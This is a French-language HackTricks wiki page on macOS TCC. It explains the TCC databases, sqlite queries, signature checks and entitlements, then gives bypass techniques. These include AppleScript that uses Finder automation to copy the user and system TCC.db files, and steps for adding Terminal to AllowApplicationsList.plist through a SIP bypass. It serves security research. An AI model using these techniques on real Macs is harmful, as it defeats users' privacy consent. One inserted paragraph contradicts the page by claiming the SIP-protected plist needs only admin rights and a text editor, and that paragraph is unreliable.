# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informations de base**

**TCC (Transparency, Consent, and Control)** est un mécanisme dans macOS pour **limiter et contrôler l'accès des applications à certaines fonctionnalités**, généralement dans une perspective de confidentialité. Cela peut inclure des services de localisation, des contacts, des photos, un microphone, une caméra, l'accessibilité, l'accès complet au disque et bien plus encore.

Du point de vue de l'utilisateur, il voit TCC en action **lorsqu'une application souhaite accéder à l'une des fonctionnalités protégées par TCC**. Lorsque cela se produit, l'utilisateur reçoit une boîte de dialogue lui demandant s'il souhaite autoriser l'accès ou non.

Il est également possible d'**accorder aux applications l'accès** aux fichiers par **des intentions explicites** de la part des utilisateurs, par exemple lorsque l'utilisateur **glisse et dépose un fichier dans un programme** (évidemment, le programme doit y avoir accès).

![Un exemple de boîte de dialogue TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** est géré par le **démon** situé dans `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` et configuré dans `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (enregistrant le service mach `com.apple.tccd.system`).

Il y a un **tccd en mode utilisateur** en cours d'exécution par utilisateur connecté, défini dans `/System/Library/LaunchAgents/com.apple.tccd.plist`, enregistrant les services mach `com.apple.tccd` et `com.apple.usernotifications.delegate.com.apple.tccd`.

Ici, vous pouvez voir le tccd en cours d'exécution en tant que système et en tant qu'utilisateur :
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Les autorisations sont héritées de l'application parente et les autorisations sont suivies en fonction de l'ID de bundle et de l'ID du développeur.

### Bases de données TCC

Les sélections sont ensuite stockées dans la base de données TCC à l'échelle du système dans **`/Library/Application Support/com.apple.TCC/TCC.db`** ou dans **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** pour les préférences par utilisateur. Les bases de données sont protégées contre la modification avec SIP (System Integrity Protection), mais vous pouvez les lire.

{% hint style="danger" %}
La base de données TCC dans **iOS** se trouve dans **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

Il existe une **troisième** base de données TCC dans **`/var/db/locationd/clients.plist`** pour indiquer les clients autorisés à accéder aux services de localisation.

De plus, un processus avec un **accès complet au disque** peut modifier la base de données en mode utilisateur. Maintenant, une application a également besoin de **FDA** ou de **`kTCCServiceEndpointSecurityClient`** pour lire la base de données (et modifier les bases de données des utilisateurs).

{% hint style="info" %}
L'interface utilisateur du **centre de notifications** peut apporter des **modifications dans la base de données TCC du système**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Cependant, les utilisateurs peuvent **supprimer ou interroger les règles** avec l'utilitaire en ligne de commande **`tccutil`**.
{% endhint %}

{% tabs %}
{% tab title="user DB" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="Base de données système" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
En vérifiant les deux bases de données, vous pouvez vérifier les autorisations qu'une application a autorisées, interdites ou n'a pas (elle demandera l'autorisation).
{% endhint %}

* La valeur **`auth_value`** peut avoir différentes valeurs : denied(0), unknown(1), allowed(2) ou limited(3).
* La raison **`auth_reason`** peut prendre les valeurs suivantes : Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
* Le champ **csreq** est là pour indiquer comment vérifier le binaire à exécuter et accorder les autorisations TCC :
```
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Pour plus d'informations sur les **autres champs** du tableau, [consultez cet article de blog](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

{% hint style="info" %}
Certaines autorisations TCC sont : kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Il n'existe pas de liste publique qui les définit toutes, mais vous pouvez consulter cette [**liste des autorisations connues**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

L'accès complet au disque est nommé **`kTCCServiceSystemPolicyAllFiles`** et **`kTCCServiceAppleEvents`** permet à l'application d'envoyer des événements à d'autres applications couramment utilisées pour **automatiser des tâches**.

**kTCCServiceEndpointSecurityClient** est une autorisation TCC qui accorde également des privilèges élevés, notamment la possibilité d'écrire dans la base de données des utilisateurs.

De plus, **`kTCCServiceSystemPolicySysAdminFiles`** permet de **modifier** l'attribut **`NFSHomeDirectory`** d'un utilisateur, ce qui modifie son dossier personnel et permet donc de **contourner TCC**.
{% endhint %}

Vous pouvez également vérifier les **autorisations déjà accordées** aux applications dans `Préférences Système --> Sécurité et confidentialité --> Confidentialité --> Fichiers et dossiers`.

{% hint style="success" %}
Notez que même si l'une des bases de données se trouve dans le dossier personnel de l'utilisateur, les utilisateurs ne peuvent pas modifier directement ces bases de données en raison de SIP (même si vous êtes root). La seule façon de configurer ou de modifier une nouvelle règle est via le panneau Préférences Système ou les invites où l'application demande à l'utilisateur.

Cependant, n'oubliez pas que les utilisateurs peuvent **supprimer ou interroger des règles** en utilisant **`tccutil`**.
{% endhint %}

#### Réinitialisation
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Vérifications de signature TCC

La **base de données** TCC stocke l'**ID de bundle** de l'application, mais elle **stocke également** des **informations** sur la **signature** pour **s'assurer** que l'application qui demande l'autorisation est la bonne.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Par conséquent, d'autres applications utilisant le même nom et le même identifiant de bundle ne pourront pas accéder aux autorisations accordées à d'autres applications.
{% endhint %}

### Attributions

Les applications **n'ont pas seulement besoin** de **demander** et d'obtenir **l'accès accordé** à certaines ressources, elles doivent également **avoir les attributions pertinentes**.\
Par exemple, **Telegram** a l'attribution `com.apple.security.device.camera` pour demander **l'accès à la caméra**. Une **application** qui **n'a pas cette attribution** ne pourra pas accéder à la caméra (et l'utilisateur ne sera même pas invité à donner les autorisations).

Cependant, pour que les applications **accèdent** à **certains dossiers utilisateur**, tels que `~/Desktop`, `~/Downloads` et `~/Documents`, elles **n'ont pas besoin** d'avoir des **attributions spécifiques**. Le système gérera l'accès de manière transparente et **invitera l'utilisateur** au besoin.

Les applications d'Apple **ne génèrent pas de fenêtres contextuelles**. Elles contiennent des **droits préalablement accordés** dans leur liste d'attributions, ce qui signifie qu'elles ne **généreront jamais de fenêtre contextuelle** et ne figureront pas dans les **bases de données TCC**. Par exemple:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Cela évitera à Calendar de demander à l'utilisateur l'accès aux rappels, au calendrier et au carnet d'adresses.

{% hint style="success" %}
En dehors de la documentation officielle sur les droits, il est également possible de trouver des informations non officielles intéressantes sur les droits dans [https://newosxbook.com/ent.jl](https://newosxbook.com/ent.jl)
{% endhint %}

### Endroits sensibles non protégés

* $HOME (lui-même)
* $HOME/.ssh, $HOME/.aws, etc
* /tmp

### Intention de l'utilisateur / com.apple.macl

Comme mentionné précédemment, il est possible d'accorder à une application l'accès à un fichier en le faisant glisser et déposer dessus. Cet accès ne sera pas spécifié dans une base de données TCC, mais en tant qu'attribut étendu du fichier. Cet attribut stockera l'UUID de l'application autorisée :
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Il est curieux que l'attribut **`com.apple.macl`** soit géré par le **Sandbox**, et non par tccd.

Notez également que si vous déplacez un fichier qui autorise l'UUID d'une application sur votre ordinateur vers un autre ordinateur, car la même application aura des UID différents, cela ne donnera pas accès à cette application.
{% endhint %}

L'attribut étendu `com.apple.macl` **ne peut pas être effacé** comme les autres attributs étendus car il est **protégé par SIP**. Cependant, comme [**expliqué dans cet article**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), il est possible de le désactiver en **compressant** le fichier, en le **supprimant** et en le **décompressant**.

## Privilèges TCC et contournements

### Élévation de privilèges de l'automatisation à la FDA

**Finder** est une application qui **a toujours la FDA** (même si elle n'apparaît pas dans l'interface utilisateur), donc si vous avez des privilèges d'**automatisation** dessus, vous pouvez abuser de ses privilèges pour **lui faire effectuer certaines actions**.

{% tabs %}
{% tab title="Vol de la base de données TCC des utilisateurs" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% tab title="Vol de la base de données TCC du système" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

Vous pouvez exploiter cela pour **écrire votre propre base de données utilisateur TCC**.

Voici l'invite TCC pour obtenir les privilèges d'automatisation sur Finder :

<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>

### Élévation de privilèges de la base de données utilisateur TCC à FDA

En obtenant les **permissions d'écriture** sur la **base de données utilisateur TCC**, vous ne pouvez pas vous accorder vous-même les permissions **`FDA`**, seul celui qui se trouve dans la base de données système peut le faire.

Mais vous pouvez vous accorder les **droits d'automatisation pour Finder**, et abuser de la technique précédente pour passer à FDA.

### Élévation de privilèges de FDA à permissions TCC

Je ne pense pas que cela soit une véritable élévation de privilèges, mais au cas où vous le trouveriez utile : si vous contrôlez un programme avec FDA, vous pouvez **modifier la base de données utilisateur TCC et vous accorder n'importe quel accès**. Cela peut être utile comme technique de persistance au cas où vous pourriez perdre vos permissions FDA.

### De la contournement de SIP à la contournement de TCC

La base de données **TCC** du système est protégée par **SIP**, c'est pourquoi seuls les processus avec les **privilèges indiqués seront en mesure de la modifier**. Par conséquent, si un attaquant trouve un **contournement de SIP** sur un **fichier** (capable de modifier un fichier restreint par SIP), il pourra **supprimer la protection** d'une base de données TCC et s'accorder toutes les permissions TCC.

Cependant, il existe une autre option pour exploiter ce **contournement de SIP pour contourner TCC**. Le fichier `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` est une liste d'applications autorisées qui nécessitent une exception TCC. Par conséquent, si un attaquant peut **supprimer la protection SIP** de ce fichier et ajouter sa **propre application**, l'application pourra contourner TCC.\
Par exemple, pour ajouter Terminal :
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

Ce fichier plist est utilisé par macOS pour gérer la liste des applications autorisées à accéder aux données sensibles protégées par le TCC (Transparency, Consent, and Control). Le TCC est un mécanisme de sécurité intégré à macOS qui permet aux utilisateurs de contrôler l'accès des applications à certaines fonctionnalités et données sensibles, telles que la caméra, le microphone, les contacts, les photos, etc.

Dans ce fichier plist, vous pouvez spécifier les applications qui sont autorisées à accéder à ces données sensibles. Chaque application est répertoriée avec son identifiant de bundle (Bundle ID). Vous pouvez ajouter ou supprimer des entrées dans ce fichier pour personnaliser les autorisations d'accès des applications.

Il est important de noter que la modification de ce fichier plist nécessite des privilèges d'administrateur. Par conséquent, seuls les utilisateurs disposant des droits d'administration peuvent apporter des modifications à ce fichier.

Pour modifier le fichier AllowApplicationsList.plist, vous pouvez utiliser un éditeur de texte ou la commande `defaults` en ligne de commande. Assurez-vous de sauvegarder une copie du fichier d'origine avant d'apporter des modifications, au cas où vous auriez besoin de revenir à la configuration précédente.

Une fois que vous avez modifié le fichier AllowApplicationsList.plist, vous devrez peut-être redémarrer votre système pour que les modifications prennent effet.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Contournements de TCC

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Références

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
